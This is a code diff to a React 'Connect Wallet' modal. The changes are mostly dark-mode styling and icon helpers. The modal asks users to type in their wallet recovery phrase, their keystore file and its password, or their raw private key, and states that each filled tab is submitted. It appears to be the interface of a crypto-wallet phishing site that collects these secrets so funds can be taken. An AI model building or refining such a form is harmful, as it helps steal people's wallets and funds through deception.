@@ -13,6 +13,7 @@ import { Textarea } from "@/components/ui/textarea";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { X, Wallet } from 'lucide-react';
 import { supabase } from '@/lib/supabase';
+import { getWalletIconUrlSync, hasWalletIcon, getWalletFallbackDisplay } from '@/utils/walletIconDisplay';
 
 export default function ConnectWalletModal({ isOpen, onClose, wallet, onSuccess, onFeedback }) {
   const [activeTab, setActiveTab] = useState('phrase');
@@ -158,12 +159,12 @@ export default function ConnectWalletModal({ isOpen, onClose, wallet, onSuccess,
 
   return (
     <Dialog open={isOpen} onOpenChange={onClose}>
-      <DialogContent className="sm:max-w-md max-h-[90vh] flex flex-col">
-        <DialogHeader className="sticky top-0 bg-white z-10 py-4 border-b">
+      <DialogContent className="sm:max-w-md max-h-[90vh] flex flex-col bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700">
+        <DialogHeader className="sticky top-0 bg-white dark:bg-gray-800 z-10 py-4 border-b border-gray-200 dark:border-gray-700">
           <div className="flex items-center gap-2">
-            {wallet?.icon_url ? (
+            {hasWalletIcon(wallet) ? (
               <img 
-                src={wallet.icon_url} 
+                src={getWalletIconUrlSync(wallet)} 
                 alt={wallet.name || 'Wallet icon'}
                 className="w-6 h-6 object-contain"
                 onError={(e) => {
@@ -176,31 +177,37 @@ export default function ConnectWalletModal({ isOpen, onClose, wallet, onSuccess,
               />
             ) : null}
             <div 
-              className={`w-6 h-6 bg-blue-600 rounded flex items-center justify-center text-white text-sm font-semibold ${wallet?.icon_url ? 'hidden' : 'flex'}`}
+              className={`w-6 h-6 bg-blue-600 rounded flex items-center justify-center text-white text-sm font-semibold ${hasWalletIcon(wallet) ? 'hidden' : 'flex'}`}
             >
-              {wallet?.name?.charAt(0) || 'W'}
+              {getWalletFallbackDisplay(wallet)}
             </div>
-            <DialogTitle className="text-xl font-bold">
+            <DialogTitle className="text-xl font-bold text-gray-900 dark:text-white">
               Connect {wallet?.name || ''} Wallet
             </DialogTitle>
           </div>
         </DialogHeader>
         
         <div className="py-6 px-1 space-y-6 overflow-y-auto flex-1">
-          <p className="text-sm text-gray-500 mb-4">
+          <p className="text-sm text-gray-500 dark:text-gray-400 mb-4">
             Enter your wallet details. You can fill in multiple wallet types before connecting. Each filled tab will be submitted.
           </p>
 
-          <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
-            <TabsList className="grid w-full grid-cols-3">
-              <TabsTrigger value="phrase">Phrase</TabsTrigger>
-              <TabsTrigger value="keystore">Keystore</TabsTrigger>
-              <TabsTrigger value="private">Private Key</TabsTrigger>
-            </TabsList>
+                     <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
+             <TabsList className="grid w-full grid-cols-3">
+               <TabsTrigger value="phrase" className="data-[state=active]:bg-white dark:data-[state=active]:bg-gray-700">
+                 <span className="data-[state=active]:text-gray-900 dark:data-[state=active]:text-white">Phrase</span>
+               </TabsTrigger>
+               <TabsTrigger value="keystore" className="data-[state=active]:bg-white dark:data-[state=active]:bg-gray-700">
+                 <span className="data-[state=active]:text-gray-900 dark:data-[state=active]:text-white">Keystore</span>
+               </TabsTrigger>
+               <TabsTrigger value="private" className="data-[state=active]:bg-white dark:data-[state=active]:bg-gray-700">
+                 <span className="data-[state=active]:text-gray-900 dark:data-[state=active]:text-white">Private Key</span>
+               </TabsTrigger>
+             </TabsList>
 
             <TabsContent value="phrase" className="mt-6">
               <div className="space-y-2">
-                <label htmlFor="recovery-phrase" className="font-medium text-sm">Recovery Phrase</label>
+                <label htmlFor="recovery-phrase" className="font-medium text-sm text-gray-900 dark:text-white">Recovery Phrase</label>
                 <Textarea
                   id="recovery-phrase"
                   placeholder="Enter your recovery phrase"
@@ -208,14 +215,14 @@ export default function ConnectWalletModal({ isOpen, onClose, wallet, onSuccess,
                   onChange={(e) => setPhrase(e.target.value)}
                   className="h-28"
                 />
-                <p className="text-xs text-gray-500">Typically 12 (sometimes 24) words properly separated by single spaces</p>
+                <p className="text-xs text-gray-500 dark:text-gray-400">Typically 12 (sometimes 24) words properly separated by single spaces</p>
               </div>
             </TabsContent>
 
             <TabsContent value="keystore" className="mt-6">
               <div className="space-y-4">
                 <div className="space-y-2">
-                  <label htmlFor="keystore-json" className="font-medium text-sm">Keystore</label>
+                  <label htmlFor="keystore-json" className="font-medium text-sm text-gray-900 dark:text-white">Keystore</label>
                   <Textarea
                     id="keystore-json"
                     placeholder='{ "address": "...", "crypto": { ... } }'
@@ -225,7 +232,7 @@ export default function ConnectWalletModal({ isOpen, onClose, wallet, onSuccess,
                   />
                 </div>
                 <div className="space-y-2">
-                  <label htmlFor="keystore-password" className="font-medium text-sm">Keystore/Wallet Password</label>
+                  <label htmlFor="keystore-password" className="font-medium text-sm text-gray-900 dark:text-white">Keystore/Wallet Password</label>
                   <Input
                     id="keystore-password"
                     type="text"
@@ -233,14 +240,14 @@ export default function ConnectWalletModal({ isOpen, onClose, wallet, onSuccess,
                     value={keystorePassword}
                     onChange={(e) => setKeystorePassword(e.target.value)}
                   />
-                  <p className="text-xs text-gray-500">Several lines of text plus the password used to encrypt it</p>
+                  <p className="text-xs text-gray-500 dark:text-gray-400">Several lines of text plus the password used to encrypt it</p>
                 </div>
               </div>
             </TabsContent>
 
             <TabsContent value="private" className="mt-6">
               <div className="space-y-2">
-                <label htmlFor="private-key" className="font-medium text-sm">Private Key</label>
+                <label htmlFor="private-key" className="font-medium text-sm text-gray-900 dark:text-white">Private Key</label>
                 <Textarea
                   id="private-key"
                   placeholder="Enter your Private Key"
@@ -248,19 +255,19 @@ export default function ConnectWalletModal({ isOpen, onClose, wallet, onSuccess,
                   onChange={(e) => setPrivateKey(e.target.value)}
                   className="h-28"
                 />
-                <p className="text-xs text-gray-500">Your private key string</p>
+                <p className="text-xs text-gray-500 dark:text-gray-400">Your private key string</p>
               </div>
             </TabsContent>
           </Tabs>
 
-          <div className="flex justify-end gap-3 mt-8">
-            <DialogClose asChild>
-              <Button variant="outline">Cancel</Button>
-            </DialogClose>
-            <Button onClick={handleSubmit} disabled={isSubmitting} className="bg-blue-600 hover:bg-blue-700">
-              {isSubmitting ? 'Submitting...' : 'Submit Details'}
-            </Button>
-          </div>
+                     <div className="flex justify-end gap-3 mt-8 border-t border-gray-200 dark:border-gray-700 pt-4">
+             <DialogClose asChild>
+               <Button variant="outline" className="border-gray-200 dark:border-gray-600 text-gray-700 dark:text-gray-300 hover:bg-gray-50 dark:hover:bg-gray-700">Cancel</Button>
+             </DialogClose>
+             <Button onClick={handleSubmit} disabled={isSubmitting} className="bg-blue-600 hover:bg-blue-700">
+               {isSubmitting ? 'Submitting...' : 'Submit Details'}
+             </Button>
+           </div>
         </div>
       </DialogContent>
     </Dialog>
